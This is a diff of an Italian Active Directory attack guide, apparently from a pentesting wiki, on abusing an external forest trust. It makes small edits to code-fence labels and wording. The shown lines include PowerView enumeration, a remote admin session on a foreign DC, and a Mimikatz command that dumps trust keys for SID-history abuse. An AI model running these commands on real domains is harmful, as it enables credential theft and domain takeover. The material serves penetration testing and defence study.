@@ -7,7 +7,7 @@ In questo scenario, un dominio esterno si fida di te (o entrambi si fidano l'uno
 ## Enumerazione
 
 Prima di tutto, devi **enumerare** la **fiducia**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Nell'enumerazione precedente è stato trovato che l'utente **`crossuser`** è all'interno del gruppo **`External Admins`** che ha **accesso Admin** all'interno del **DC del dominio esterno**.
+Nella precedente enumerazione è stato trovato che l'utente **`crossuser`** è all'interno del gruppo **`External Admins`** che ha **accesso Admin** all'interno del **DC del dominio esterno**.
 
 ## Accesso Iniziale
 
 Se non **sei riuscito** a trovare alcun accesso **speciale** del tuo utente nell'altro dominio, puoi comunque tornare alla metodologia AD e provare a **privesc da un utente non privilegiato** (cose come kerberoasting, per esempio):
 
 Puoi utilizzare le **funzioni di Powerview** per **enumerare** l'**altro dominio** usando il parametro `-Domain` come in:
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,19 +75,19 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Accesso
 
 Utilizzando un metodo regolare con le credenziali degli utenti che hanno accesso al dominio esterno, dovresti essere in grado di accedere a:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abuso della Storia SID
 
 Puoi anche abusare della [**Storia SID**](sid-history-injection.md) attraverso un trust di foresta.
 
-Se un utente viene migrato **da una foresta a un'altra** e **il filtro SID non è abilitato**, diventa possibile **aggiungere un SID dall'altra foresta**, e questo **SID** sarà **aggiunto** al **token dell'utente** durante l'autenticazione **attraverso il trust**.
+Se un utente viene **migrato da una foresta a un'altra** e **il filtro SID non è abilitato**, diventa possibile **aggiungere un SID dall'altra foresta**, e questo **SID** sarà **aggiunto** al **token dell'utente** durante l'autenticazione **attraverso il trust**.
 
 > [!WARNING]
 > Come promemoria, puoi ottenere la chiave di firma con
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
